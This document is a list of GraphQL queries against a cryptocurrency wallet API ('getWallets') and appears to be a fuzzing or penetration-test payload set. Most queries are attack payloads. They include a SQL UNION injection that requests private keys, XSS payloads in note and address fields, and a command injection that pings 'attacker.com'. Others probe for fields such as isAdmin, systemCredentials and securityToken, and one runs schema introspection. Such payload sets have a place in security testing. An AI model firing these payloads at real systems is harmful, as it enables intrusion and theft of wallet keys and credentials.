query getWallets {
  getWallets {
    id
    address
    balance
    currency
  }
}

query getWallets {
  getWallets(filter: "wallet_id = 1' UNION SELECT null,version(),current_user--") {
    id
    privateKey
  }
}

query getWallets {
  getWallets(note: "<img src=x onerror=alert(1)>") {
    id
    noteHtml
  }
}

query getWallets {
  getWallets(owner: "user123; ping -c 5 attacker.com") {
    owner
    lastModified
  }
}

query getWallets {
  getWallets(address: "<iframe src=javascript:alert(document.domain)>") {
    id
    address
  }
}

query getWallets {
  getWallets {
    id
    isAdmin
    systemCredentials
  }
}

query getWallets {
  s: getWallets {
    a: id
    b: isAdmin
    c: securityToken
  }
}

query Introspection {
  getWallets {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      kind
      name
      description
    }
  }
}

query getWalletzzz {
  getWallets(name: "Wallet") {
    fields {
      name
      type {
        name
      }
    }
  }
}
